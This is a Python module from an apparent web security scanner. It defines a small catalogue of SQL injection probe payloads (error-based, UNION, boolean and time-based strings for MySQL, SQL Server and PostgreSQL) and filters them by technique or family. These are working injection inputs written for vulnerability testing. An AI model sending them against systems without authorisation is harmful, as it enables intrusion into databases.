"""
Module: talos.sqli.payloads

Purpose:
    Curated SQL injection payload catalogue for v1.

    Payloads are appended to the captured field value (not replacements)
    so typed fields (dates, numbers) still break out of SQL context.

    Keep this list small: one job per (flow, entry point, payload).

Dependencies: talos.sqli.models
Data flow: CLI / engine → generate_sqli_payloads → job meta
Side effects: None.
"""

from __future__ import annotations

from typing import Optional

from talos.sqli.models import (
    FAMILIES,
    FAMILY_BOOLEAN,
    FAMILY_ERROR,
    FAMILY_TIME,
    FAMILY_UNION,
    TECHNIQUE_NAMES,
    SqliPayload,
)

TIME_DELAY_S = 5.0


def generate_sqli_payloads(
    *,
    techniques: Optional[list[str]] = None,
    families: Optional[list[str]] = None,
) -> list[SqliPayload]:
    """
    Purpose:
        Build the v1 SQLi probe set, optionally filtered.
    Input:
        techniques — optional allow-list of technique ids.
        families   — optional allow-list of families (error/union/boolean/time).
    Output:
        Ordered SqliPayload list.
    Side effects: None.
    """
    payloads: list[SqliPayload] = [
        SqliPayload(
            technique="quote_single",
            family=FAMILY_ERROR,
            payload="'",
            description="Single quote.",
        ),
        SqliPayload(
            technique="quote_double",
            family=FAMILY_ERROR,
            payload='"',
            description="Double quote.",
        ),
        SqliPayload(
            technique="quote_paren",
            family=FAMILY_ERROR,
            payload="')",
            description="Close quote and parenthesis.",
        ),
        SqliPayload(
            technique="comment_dash",
            family=FAMILY_ERROR,
            payload="'--",
            description="Quote plus line comment.",
        ),
        SqliPayload(
            technique="stacked_semi",
            family=FAMILY_ERROR,
            payload="';--",
            description="Stacked-query terminator.",
        ),
        SqliPayload(
            technique="tautology",
            family=FAMILY_ERROR,
            payload="' OR '1'='1",
            description="OR 1=1 tautology.",
        ),
        SqliPayload(
            technique="mssql_convert",
            family=FAMILY_ERROR,
            payload="' AND CONVERT(int,@@version)--",
            description="SQL Server CONVERT error-based.",
        ),
        SqliPayload(
            technique="mysql_extractvalue",
            family=FAMILY_ERROR,
            payload="' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
            description="MySQL EXTRACTVALUE error-based.",
        ),
        SqliPayload(
            technique="union_1",
            family=FAMILY_UNION,
            payload="' UNION SELECT NULL--",
            description="UNION 1 column.",
        ),
        SqliPayload(
            technique="union_2",
            family=FAMILY_UNION,
            payload="' UNION SELECT NULL,NULL--",
            description="UNION 2 columns.",
        ),
        SqliPayload(
            technique="union_3",
            family=FAMILY_UNION,
            payload="' UNION SELECT NULL,NULL,NULL--",
            description="UNION 3 columns.",
        ),
        SqliPayload(
            technique="union_4",
            family=FAMILY_UNION,
            payload="' UNION SELECT NULL,NULL,NULL,NULL--",
            description="UNION 4 columns.",
        ),
        SqliPayload(
            technique="union_5",
            family=FAMILY_UNION,
            payload="' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
            description="UNION 5 columns.",
        ),
        SqliPayload(
            technique="bool_true",
            family=FAMILY_BOOLEAN,
            payload="' AND '1'='1",
            description="Boolean true.",
        ),
        SqliPayload(
            technique="bool_false",
            family=FAMILY_BOOLEAN,
            payload="' AND '1'='2",
            description="Boolean false.",
        ),
        SqliPayload(
            technique="mssql_waitfor",
            family=FAMILY_TIME,
            payload="'; WAITFOR DELAY '0:0:5'--",
            description="SQL Server 5s delay.",
            delay_s=TIME_DELAY_S,
        ),
        SqliPayload(
            technique="mysql_sleep",
            family=FAMILY_TIME,
            payload="' OR SLEEP(5)--",
            description="MySQL 5s sleep.",
            delay_s=TIME_DELAY_S,
        ),
        SqliPayload(
            technique="pg_sleep",
            family=FAMILY_TIME,
            payload="'; SELECT pg_sleep(5)--",
            description="PostgreSQL 5s sleep.",
            delay_s=TIME_DELAY_S,
        ),
    ]

    if families:
        allow_fam = {name.strip().lower() for name in families if name and name.strip()}
        unknown_fam = allow_fam - set(FAMILIES)
        if unknown_fam:
            raise ValueError(
                "unknown SQLi family: " + ", ".join(sorted(unknown_fam))
            )
        payloads = [item for item in payloads if item.family in allow_fam]

    if techniques:
        allow = {name.strip() for name in techniques if name and name.strip()}
        unknown = allow - set(TECHNIQUE_NAMES)
        if unknown:
            raise ValueError(
                "unknown SQLi technique(s): " + ", ".join(sorted(unknown))
            )
        payloads = [item for item in payloads if item.technique in allow]
    return payloads
